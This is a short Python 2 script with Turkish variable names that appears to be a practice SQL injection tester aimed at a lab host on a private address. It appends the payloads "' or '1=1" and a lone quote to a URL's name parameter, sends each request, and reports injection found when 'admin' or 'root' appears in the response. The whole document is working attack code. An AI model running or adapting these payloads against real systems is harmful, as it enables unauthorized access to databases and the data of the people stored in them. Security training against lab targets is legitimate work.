import requests
url="http://192.168.213.136/sqli/example1.php?name=root"
deger=str(url).find('=')
payload=["'%20or%20'1=1","'"]
for i in range(0,len(payload),1):
    yazi= str(url[0:deger+1])+str(payload[i])
    print yazi
    sonuc=requests.get(yazi)
    if ("admin" in sonuc.content) or ("root" in sonuc.content):
        print "Sqli bulundu,payload: ",str(payload[i])
    print "\n================\n"
